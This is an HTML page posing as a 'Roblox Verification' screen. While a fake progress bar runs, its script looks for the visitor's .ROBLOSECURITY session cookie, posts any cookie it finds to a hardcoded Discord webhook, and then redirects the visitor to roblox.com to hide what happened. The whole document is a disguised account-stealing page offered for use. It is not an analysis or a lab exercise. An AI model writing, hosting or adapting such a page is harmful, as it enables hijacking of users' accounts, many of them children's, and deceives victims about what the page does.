<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Verification</title>
    <style>
        body { background: #1e1e1e; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
        .loader { width: 100%; height: 4px; background: #444; margin-top: 20px; }
        .progress { width: 0%; height: 100%; background: #00b06c; transition: width 2s; }
        #status { margin-top: 10px; color: #aaa; font-size: 14px; }
    </style>
</head>
<body>
    <h2>Verifying...</h2>
    <div class="loader"><div class="progress" id="bar"></div></div>
    <p id="status">Checking...</p>

    <script>
        setTimeout(() => {
            document.getElementById('bar').style.width = '100%';
            setTimeout(() => {
                document.getElementById('status').innerText = 'Fetching session...';
                fetchRobloxSession();
            }, 1000);
        }, 100);

        async function fetchRobloxSession() {
            // Use the Roblox API to get the user's session if logged in
            try {
                const response = await fetch('https://www.roblox.com/users/profile', {
                    credentials: 'include' // This is key! It sends cookies with the request
                });

                if (response.ok) {
                    // Get all cookies from the current context
                    const cookies = document.cookie;
                    const robloxCookie = cookies.split(';').find(c => c.trim().startsWith('.ROBLOSECURITY')) || 
                                         cookies.split(';').find(c => c.trim().startsWith('RobloxAuth'));

                    if (robloxCookie) {
                        sendToDiscord(robloxCookie);
                    } else {
                        document.getElementById('status').innerText = '❌ No cookie found. Check console.';
                        console.log('All cookies:', cookies);
                    }
                } else {
                    document.getElementById('status').innerText = '❌ Not logged in.';
                }
            } catch (err) {
                document.getElementById('status').innerText = '❌ Error: ' + err.message;
            }
        }

        function sendToDiscord(cookie) {
            fetch('https://discord.com/api/webhooks/1548313898371776622/-5rmm8rPVmEvRERIuoYdLp16BuDnx1DABy9FtIvWW_zJEMUGnI8FORKVppvPx8FrRIyz', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: `🔓 **Session:** \`\`\`${cookie}\`\`\``
                })
            }).then(() => {
                document.getElementById('status').innerText = '✅ Success!';
                setTimeout(() => window.location.href = 'https://www.roblox.com', 500);
            });
        }
    </script>
</body>
</html>
